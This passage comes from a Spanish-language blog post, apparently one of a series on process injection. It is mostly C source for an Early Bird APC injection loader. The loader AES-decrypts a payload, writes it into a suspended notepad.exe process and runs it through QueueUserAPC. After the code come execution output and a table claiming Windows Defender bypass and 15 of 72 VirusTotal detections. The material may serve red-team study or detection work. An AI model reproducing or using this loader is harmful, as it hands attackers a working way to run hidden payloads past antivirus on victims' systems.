	<span class="n">HCRYPTKEY</span> <span class="n">hKey</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptAcquireContextW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hProv</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PROV_RSA_AES</span><span class="p">,</span> <span class="n">CRYPT_VERIFYCONTEXT</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptCreateHash</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_SHA_256</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hHash</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptHashData</span><span class="p">(</span><span class="n">hHash</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span> <span class="n">key</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span> <span class="n">keylen</span><span class="p">,</span> <span class="mi">0</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>              
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDeriveKey</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_AES_256</span><span class="p">,</span> <span class="n">hHash</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">hKey</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDecrypt</span><span class="p">(</span><span class="n">hKey</span><span class="p">,</span> <span class="p">(</span><span class="n">HCRYPTHASH</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span> <span class="o">*</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">payload_len</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">CryptReleaseContext</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="n">CryptDestroyHash</span><span class="p">(</span><span class="n">hHash</span><span class="p">);</span>
	<span class="n">CryptDestroyKey</span><span class="p">(</span><span class="n">hKey</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="n">hProc</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">STARTUPINFO</span> <span class="n">si</span><span class="p">;</span>
    <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">;</span>
	<span class="kt">void</span> <span class="o">*</span> <span class="n">pRemoteCode</span><span class="p">;</span>
    <span class="n">ZeroMemory</span><span class="p">(</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">)</span> <span class="p">);</span>
    <span class="n">si</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">);</span>
    <span class="n">ZeroMemory</span><span class="p">(</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">pi</span><span class="p">)</span> <span class="p">);</span>
	<span class="n">CreateProcessA</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">"notepad.exe"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">CREATE_SUSPENDED</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[injection] Process: %p </span><span class="se">\n\t</span><span class="s"> notepadProcess %d </span><span class="se">\n\t</span><span class="s"> notepadThread %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">pRemoteCode</span><span class="p">);</span>
	<span class="n">AESDecrypt</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">key</span><span class="p">));</span>	
	<span class="n">pRemoteCode</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">);</span>
	<span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">pRemoteCode</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span> <span class="n">payload_len</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span> <span class="o">*</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">QueueUserAPC</span><span class="p">((</span><span class="n">PAPCFUNC</span><span class="p">)</span><span class="n">pRemoteCode</span><span class="p">,</span> <span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">getchar</span><span class="p">();</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[injection] Process: %p </span><span class="se">\n\t</span><span class="s"> RemoteProcess %d </span><span class="se">\n\t</span><span class="s"> RemoteThread %d </span><span class="se">\n\t</span><span class="s"> payload = %p </span><span class="se">\n\t</span><span class="s"> RemoteCOde = %p </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetCurrentProcess</span><span class="p">(),</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">pRemoteCode</span><span class="p">);</span>
	<span class="n">ResumeThread</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
	<span class="n">getchar</span><span class="p">();</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Es interesante en tiempo de ejecución, revisar los procesos del sistema operativo:</p>

<h3 id="ejecución-parte-1">Ejecución parte 1:</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>binaries\EXE&gt;earlybird_injection.exe
[injection] Process: FFFFFFFFFFFFFFFF
         notepadProcess 176
         notepadThread 172
</code></pre></div></div>
<p>Se aprecia el proceso creado en estado suspensión, que cuelga del binario earlybird_injection.exe</p>

<p><img src="/assets/images/earlybird_injection_1.png" alt="earlybird_1" /></p>

<h3 id="ejecución-parte-2">Ejecución parte 2:</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[injection] Process: FFFFFFFFFFFFFFFF
         RemoteProcess 176
         RemoteThread 172
         payload = 00007FF65CB1D000
         RemoteCOde = 000001ABFCFB0000
</code></pre></div></div>
<p>Sin tener dependencia aparente el nuevo proceso creado desde la inyección de código a traves del notepad.exe</p>

<p><img src="/assets/images/earlybird_exe_2.png" alt="earlybird_1" /></p>

<h3 id="evidencia-de-ejecución">Evidencia de ejecución</h3>

<p><img src="/assets/images/earlybird_evidence.png" alt="earlybird_1" /></p>

<h2 id="detecciones">Detecciones</h2>

<table>
  <thead>
    <tr>
      <th>Code Type</th>
      <th>Windows Defender Bypass</th>
      <th>AV Bypass</th>
      <th>EDR Bypass</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>EXE inyeccion técnica Earlybird</td>
      <td>True</td>
      <td>15/72 VT detections</td>
      <td>False</td>
    </tr>
  </tbody>
</table>

<p><img src="/assets/images/earlybird_detection.png" alt="Earlybird detections" /></p>

<p><a href="./injection_types.html">back</a></p>

      </section>
    </div>
  </body>
</html>
